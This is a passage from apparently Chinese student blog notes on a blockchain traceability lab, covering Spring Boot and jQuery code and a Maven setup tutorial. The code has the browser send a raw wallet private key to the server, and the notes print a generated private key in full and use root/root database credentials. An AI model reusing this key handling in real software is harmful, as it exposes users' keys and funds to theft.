DELETE 等</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">contentType</span>: <span class="string">&#x27;application/json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                processName,</span></span><br><span class="line"><span class="language-javascript">                content,</span></span><br><span class="line"><span class="language-javascript">                privateKey,</span></span><br><span class="line"><span class="language-javascript">                code</span></span><br><span class="line"><span class="language-javascript">            &#125;),</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 在这里处理从服务器返回的数据</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> &#123; code, msg &#125; = data</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(code === <span class="string">&#x27;1&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">closeModal</span>()</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&#x27;新增成功&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span>  &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(msg)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                loading = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 处理请求失败的情况</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error: &#x27;</span> + textStatus + <span class="string">&#x27; &#x27;</span> + errorThrown);</span></span><br><span class="line"><span class="language-javascript">                loading = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对应路由代码块</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/toChain&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">toChain</span><span class="params">(<span class="meta">@RequestBody</span> ChainDataBo chainDataBo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(chainDataBo.getCode()) || chainDataBo.getCode() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;溯源码不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(chainDataBo.getPrivateKey()) || chainDataBo.getPrivateKey() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;钱包私钥不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(chainDataBo.getContent()) || chainDataBo.getContent() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;内容不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(chainDataBo.getProcessName()) || chainDataBo.getProcessName() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;流程名不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TCode</span> <span class="variable">tCode</span> <span class="operator">=</span> codeDao.queryByCode(chainDataBo.getCode());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TChainData</span> <span class="variable">tChainData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TChainData</span>();</span><br><span class="line">        tChainData.setFrom(tCode.getAddress());</span><br><span class="line">        tChainData.setTo(<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        tChainData.setContent(chainDataBo.getContent());</span><br><span class="line">        tChainData.setCreateTime(DateUtils.getTime());</span><br><span class="line">        tChainData.setCode(tCode.getCode());</span><br><span class="line">        tChainData.setProductName(tCode.getProductName());</span><br><span class="line">        tChainData.setProcessName(chainDataBo.getProcessName());</span><br><span class="line">        tChainData.setChainStatus(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        tChainData.setBlockIndex(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//String jsonStr = new Gson().toJson(tChainData.toString());</span></span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GsonBuilder</span>()</span><br><span class="line">                .disableHtmlEscaping() <span class="comment">// 禁用 HTML 转义</span></span><br><span class="line">                .create();</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> gson.toJson(tChainData);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">pri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(chainDataBo.getPrivateKey(), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TradeObject</span> <span class="variable">tradeObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TradeObject</span>();</span><br><span class="line">        tradeObject.setFrom(tCode.getAddress());</span><br><span class="line">        tradeObject.setTo(<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        tradeObject.setType(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        tradeObject.setContent(jsonStr);</span><br><span class="line">        tradeObject.setJsoncreatetime(DateUtils.getTime());</span><br><span class="line">        tradeObject.setObjToString(tradeObject.toString());</span><br><span class="line"></span><br><span class="line">        Sign.<span class="type">SignatureData</span> <span class="variable">signatureData</span> <span class="operator">=</span> EthUtils.signMessage(tradeObject.toString(),pri);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sign</span> <span class="operator">=</span> EthUtils.getSignStr(signatureData);</span><br><span class="line">        tradeObject.setSign(sign);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">hashNo</span> <span class="operator">=</span> PendingUtils.genTradeNo(tradeObject);</span><br><span class="line">        tChainData.setHashNo(hashNo);</span><br><span class="line">        <span class="comment">//保存上链数据到数据库</span></span><br><span class="line">        chainDataDao.save(tChainData);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上链发送交易</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;:8001/data/trade&quot;</span>;</span><br><span class="line">        restTemplate.postForEntity(url, tradeObject, TradeObject.class);</span><br><span class="line"></span><br><span class="line">        jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;提交交易成功&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="六-操作流程"><a href="#六-操作流程" class="headerlink" title="六. 操作流程"></a>六. 操作流程</h2><h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>git clone一下项目文件，然后右键pom文件添加maven项目拉取依赖</p>
<p>修改配置文件<code>application.properties</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#é¡¹ç®ç«¯å£å·</span><br><span class="line">server.port=8007</span><br><span class="line"></span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/suyuan?useUnicode=true&amp;useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=root</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line"></span><br><span class="line">### datasource-pool</span><br><span class="line">spring.datasource.type=com.zaxxer.hikari.HikariDataSource</span><br><span class="line">spring.datasource.hikari.minimum-idle=10</span><br><span class="line">spring.datasource.hikari.maximum-pool-size=30</span><br><span class="line">spring.datasource.hikari.auto-commit=true</span><br><span class="line">spring.datasource.hikari.idle-timeout=30000</span><br><span class="line">spring.datasource.hikari.pool-name=HikariCP</span><br><span class="line">spring.datasource.hikari.max-lifetime=900000</span><br><span class="line">spring.datasource.hikari.connection-timeout=10000</span><br><span class="line">spring.datasource.hikari.connection-test-query=SELECT 1</span><br><span class="line">spring.datasource.hikari.validation-timeout=1000</span><br><span class="line">spring.servlet.multipart.max-file-size=100MB</span><br><span class="line">spring.servlet.multipart.max-request-size=100MB</span><br><span class="line"></span><br><span class="line">mybatis.mapper-locations=classpath:/mybatis-mapper/*Mapper.xml</span><br><span class="line">mybatis.configuration.map-underscore-to-camel-case=true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">node.ip=192.132.43.96</span><br><span class="line"></span><br><span class="line">spring.thymeleaf.prefix=classpath:/templates/</span><br><span class="line">spring.thymeleaf.mode=HTML</span><br></pre></td></tr></table></figure>

<p>新建数据库连接，导入数据库文件</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145553190.png" alt="image-20241102145553190"></p>
<p>成功导入</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102145728813.png" alt="image-20241102145728813"></p>
<h3 id="2-前往首页"><a href="#2-前往首页" class="headerlink" title="2. 前往首页"></a>2. 前往首页</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8007/index</span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102150954461.png" alt="image-20241102150954461"></p>
<h3 id="3-新增商品"><a href="#3-新增商品" class="headerlink" title="3. 新增商品"></a>3. 新增商品</h3><p>我们使用上次实训5的生成的钱包地址</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;生成钱包成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;o&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;publicKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2e58fdca4a243486b9ecfd9287e3c56258eaee31761025ebc4acbe636e5c767b453b5465b755b22c1cb572c32e7e98241193b7e8dbe6ed2b6d3eb81668883772&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;privateKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ced6cc51ee0d2063211564e53012aaac4c0b4978e8cc22a11ed998de4e4bcc3b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xed6d1bcb771e59765ab65f43b9406669428af057&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102155327689.png" alt="image-20241102155327689"></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102155336368.png" alt="image-20241102155336368"></p>
<h3 id="4-新增溯源码"><a href="#4-新增溯源码" class="headerlink" title="4. 新增溯源码"></a>4. 新增溯源码</h3><p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102155541482.png" alt="image-20241102155541482"></p>
<h3 id="5-查看溯源码"><a href="#5-查看溯源码" class="headerlink" title="5. 查看溯源码"></a>5. 查看溯源码</h3><p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102155649663.png" alt="image-20241102155649663"></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102155707562.png" alt="image-20241102155707562"></p>
<p>点击新增流程（注：要记得先启动挖矿，到后面才能成功上链）</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102155741777.png" alt="image-20241102155741777"></p>
<h3 id="6-下载图片"><a href="#6-下载图片" class="headerlink" title="6. 下载图片"></a>6. 下载图片</h3><blockquote>
<p>需要手机和电脑在同一网络下才能扫码查看</p>
</blockquote>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102160312068.png" alt="image-20241102160312068"></p>
<p>在线扫描二维码网站<code>https://cli.im/text</code></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102160409314.png" alt="image-20241102160409314"></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102160734445.png" alt="image-20241102160734445"></p>
<p>访问一下，成功查到产品信息</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241102161109642.png" alt="image-20241102161109642"></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>区块链实训1</title>
    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE.html</url>
    <content><![CDATA[<p>了解相关sprintboot框架搭建</p>
<span id="more"></span>



<h1 id="sprintboot框架搭建与配置"><a href="#sprintboot框架搭建与配置" class="headerlink" title="sprintboot框架搭建与配置"></a>sprintboot框架搭建与配置</h1><h2 id="java环境配置"><a href="#java环境配置" class="headerlink" title="java环境配置"></a>java环境配置</h2><p>打开cmd查看java版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907155406199.png"></p>
<h2 id="IntelliJ-IDEA开发环境搭建"><a href="#IntelliJ-IDEA开发环境搭建" class="headerlink" title="IntelliJ IDEA开发环境搭建"></a>IntelliJ IDEA开发环境搭建</h2><p>具体搭建过程可以去网上搜教程</p>
<h2 id="maven环境搭建"><a href="#maven环境搭建" class="headerlink" title="maven环境搭建"></a>maven环境搭建</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Apache Maven 是一个非常流行的 Java 项目管理和构建工具。它被广泛用于管理和构建 Java 应用程序。Maven 的核心理念是为项目提供了一种统一的标准构建过程，这有助于简化项目的构建、依赖管理和文档生成等。（简单来讲就是管理依赖包的工具）</p>
<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>将压缩包解压到不含中文路径的或空格的文件夹</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907155826237.png"></p>
<p>然后将maven的安装目录配置到系统环境中</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907160046771.png"></p>
<p>建好后再去Path添加环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%MAVEN_HOME%\bin</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907160213173.png"></p>
<p>环境变量保存好后，去验证一下是否成功</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907160301659.png"></p>
<h3 id="修改maven仓库下载地址"><a href="#修改maven仓库下载地址" class="headerlink" title="修改maven仓库下载地址"></a>修改maven仓库下载地址</h3><p>打开<code>apache-maven-3.6.0\conf</code>下的settings.xml，这里改为阿里云的仓库和163仓库</p>
<p>全局搜索mirror将原来的镜像换成下面的即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-163<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus 163<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">url</span>&gt;</span>http://mirrors.163.com/maven/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="创建使用maven管理的项目"><a href="#创建使用maven管理的项目" class="headerlink" title="创建使用maven管理的项目"></a>创建使用maven管理的项目</h3><p>我们先新建一个项目</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907160505406.png"></p>
<p>选择好maven和我们安装好的JDK，点击创建，可以看到我们项目结构和之前创建的项目有些不同</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907160621213.png"></p>
<p>和main目录并排的test没有用，我们删掉即可。然后把java文件夹改为根目录</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907160738277.png"></p>
<p>现在IDEA帮我们创建了一个简单的pom文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>test_demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们改成前面下的maven文件，在idea右侧找到maven后，点开小螺丝把配置更改为我们自己的配置</p>
<p>需要选中刚才安装的3.6.0的maven的版本，settings.xml也需要换成刚刚改的</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907161210614.png"></p>
<p>然后点击重新加载所有Maven项目即可</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907162901879.png"></p>
<h2 id="springboot项目搭建"><a href="#springboot项目搭建" class="headerlink" title="springboot项目搭建"></a>springboot项目搭建</h2><h3 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h3><p>我们使用前面创建的项目对pom.xml文件进行修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.4.0&lt;/version&gt;</span><br><span class="line">        &lt;relativePath/&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;test_demo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;source&gt;$&#123;java.version&#125;&lt;/source&gt;</span><br><span class="line">                    &lt;target&gt;$&#123;java.version&#125;&lt;/target&gt;</span><br><span class="line">                    &lt;encoding&gt;$&#123;project.build.sourceEncoding&#125;&lt;/encoding&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">    &lt;repositories&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">            &lt;id&gt;public&lt;/id&gt;</span><br><span class="line">            &lt;name&gt;aliyun nexus&lt;/name&gt;</span><br><span class="line">            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;</span><br><span class="line">            &lt;releases&gt;</span><br><span class="line">                &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">            &lt;/releases&gt;</span><br><span class="line">        &lt;/repository&gt;</span><br><span class="line">    &lt;/repositories&gt;</span><br><span class="line"></span><br><span class="line">    &lt;pluginRepositories&gt;</span><br><span class="line">        &lt;pluginRepository&gt;</span><br><span class="line">            &lt;id&gt;public&lt;/id&gt;</span><br><span class="line">            &lt;name&gt;aliyun nexus&lt;/name&gt;</span><br><span class="line">            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;</span><br><span class="line">            &lt;releases&gt;</span><br><span class="line">                &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">            &lt;/releases&gt;</span><br><span class="line">            &lt;snapshots&gt;</span><br><span class="line">                &lt;enabled&gt;false&lt;/enabled&gt;</span><br><span class="line">            &lt;/snapshots&gt;</span><br><span class="line">        &lt;/pluginRepository&gt;</span><br><span class="line">    &lt;/pluginRepositories&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>配置完pom.xml以后我们需要点开idea右侧的工具栏maven，点击刷新maven就会去镜像仓库下载文件</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20240907163702368.png"></p>
<h3 id="创建application-properties配置文件"><a href="#创建application-properties配置文件" class="headerlink" title="创建application.properties配置文件"></a>创建application.properties配置文件</h3><p>然后在resources下新建一个spring配置文件，等有需要再写入内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">application.properties</span><br></pre></td></tr></table></figure>

